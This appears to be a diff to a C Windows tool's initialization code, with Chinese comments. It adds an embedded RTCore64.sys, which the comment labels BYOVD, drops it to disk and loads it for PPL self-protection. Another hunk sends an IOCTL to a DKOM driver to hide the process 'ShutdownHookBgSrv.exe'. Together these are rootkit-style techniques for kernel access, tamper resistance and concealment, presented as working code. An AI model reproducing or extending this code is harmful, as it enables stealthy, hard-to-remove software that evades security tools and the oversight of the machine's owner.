@@ -22,6 +22,7 @@
 
 #include "../driver/GlobalShutdownHook/gsh_common.h"
 #include "../driver/Auxiliary/Auxiliary.h"
+#include "RTCore64_embedded.h"  /* 内嵌的 RTCore64.sys (BYOVD) */
 
 /* ---- 调试宏 ---- */
 #define DBG_PRINT(fmt, ...) \
@@ -986,6 +987,8 @@ static int CmdInit(VOID)
     /* 6. PPL 保护 — 通过独立 PPLControl.exe 实现 (依赖 RTCore64.sys) */
     {
         DBG_PRINT("Starting PPL protection setup...");
+
+        /* 从内嵌数据释放 RTCore64.sys 到临时文件 */
         WCHAR rtCorePath[MAX_PATH];
         wcscpy_s(rtCorePath, MAX_PATH, driverPath);
         WCHAR *rcSlash = wcsrchr(rtCorePath, L'\\');
@@ -993,6 +996,27 @@ static int CmdInit(VOID)
             *(rcSlash + 1) = L'\0';
         wcscat_s(rtCorePath, MAX_PATH, L"RTCore64.sys");
         DBG_PRINT("RTCore64.sys path = %ls", rtCorePath);
+
+        /* 如果文件不存在，从内嵌数据释放 */
+        if (GetFileAttributesW(rtCorePath) == INVALID_FILE_ATTRIBUTES)
+        {
+            DBG_PRINT("RTCore64.sys not found on disk, extracting from embedded data...");
+            HANDLE hFile = CreateFileW(rtCorePath, GENERIC_WRITE, 0, NULL,
+                                       CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+            if (hFile != INVALID_HANDLE_VALUE)
+            {
+                DWORD bytesWritten = 0;
+                WriteFile(hFile, RTCore64_sys_data, (DWORD)RTCore64_sys_size,
+                          &bytesWritten, NULL);
+                CloseHandle(hFile);
+                printf("[OK] RTCore64.sys extracted from embedded data (%zu bytes).\n", RTCore64_sys_size);
+                DBG_PRINT("Extracted %lu bytes to %ls", bytesWritten, rtCorePath);
+            }
+            else
+            {
+                fprintf(stderr, "[WARN] Failed to extract RTCore64.sys: %lu\n", GetLastError());
+            }
+        }
 
         DBG_PRINT("Calling GdrvLoadDriver(%ls)", rtCorePath);
         int rcRtc = GdrvLoadDriver(rtCorePath);
@@ -1086,10 +1110,11 @@ static int CmdInit(VOID)
                 DBG_PRINT("HideProcess device opened, handle=0x%p", hDkom);
                 char procName[] = "ShutdownHookBgSrv.exe";
                 DWORD bytesRet = 0;
-                /* IOCTL_GET_PROCESSNAME = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
-                   = 0x000020C0 */
-                DBG_PRINT("Sending IOCTL 0x000020C0 with process name: %s", procName);
-                BOOL ioctlResult = DeviceIoControl(hDkom, 0x000020C0,
+                /* IOCTL 定义照抄 HideProcessesDKOM/UserApp/UserApp.cpp:
+                   #define IOCTL_GET_PROCESSNAME CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS) */
+                #define IOCTL_GET_PROCESSNAME CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
+                DBG_PRINT("Sending IOCTL IOCTL_GET_PROCESSNAME with process name: %s", procName);
+                BOOL ioctlResult = DeviceIoControl(hDkom, IOCTL_GET_PROCESSNAME,
                                                    procName, (DWORD)strlen(procName) + 1,
                                                    NULL, 0, &bytesRet, NULL);
                 DBG_PRINT("DKOM hide IOCTL returned %d, error=%lu", ioctlResult, GetLastError());
